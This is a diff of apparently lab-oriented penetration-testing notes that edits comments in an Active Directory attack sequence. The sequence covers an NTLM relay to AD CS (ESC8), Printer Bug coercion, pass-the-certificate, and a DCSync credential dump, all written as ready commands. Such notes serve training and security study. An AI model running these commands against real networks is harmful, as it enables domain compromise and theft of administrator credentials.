@@ -285,20 +285,20 @@ dir \\dc01\julio
 
 ## AD CS NTLM Relay Attack (ESC8)
   
-  # CA01 = machine in domain , DC01 = domain controller
+  # CA01 = machine in domain , DC01 = domain controller (computer account)
   
-# MACHINE-ACCOUNT/DC01 NTLM Auth ──► Attacker (ntlmrelayx) ──► ADCS (<C01>/certsrv/certfnsh.asp) ──► Kerberos Cert ──► Impersonation
+# MACHINE-ACCOUNT/DC01 NTLM Auth ──► Attacker (ntlmrelayx) ──► ADCS (<C01>/certsrv/certfnsh.asp) ──► Kerberos Cert ──► Impersonation the DC01 Computer Account
   impacket-ntlmrelayx -t http://<MACHINE_C01-ip>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
     # enum the template value:
     certipy find -u <user> -p <pass> -dc-ip <ip>
-  # attcker the victime to auth to his \\ATTACKER\SHARE or:
+  # attcker wait the victime to auth to his \\ATTACKER\SHARE or:
      # Force DC01$ to auth back to attacker using Printer Bug
-     python3 printerbug.py INLANEFREIGHT.LOCAL/<CA01_USER>:"PASS"@<DC01-ip> <ATTACKER-ip> #=>  ./DC01$.pfx (get get the machine account(dc01$) cert)
+     python3 printerbug.py INLANEFREIGHT.LOCAL/<CA01_USER>:"PASS"@<DC01-ip> <ATTACKER-ip> #=>  ./DC01$.pfx (get get the computer account(dc01$) cert)
 
 ## Pass-the-Certificate attack to obtain a TGT as DC01$
   python3 gettgtpkinit.py -cert-pfx ./DC01$.pfx -dc-ip <DC01-IP> 'inlanefreight.local/dc01$' /tmp/dc.ccache # -> DC01 TGT
   export KRB5CCNAME=/tmp/dc.ccache  
-  # DCSync attack: dump administrator NTLM hash 
+  # DCSync attack: dump administrator NTLM hash
   impacket-secretsdump -k -no-pass -dc-ip <DC01-IP> -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
   impacket-secretsdump -k -no-pass -dc-ip <DC01-IP> 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL # extrace all creds
 
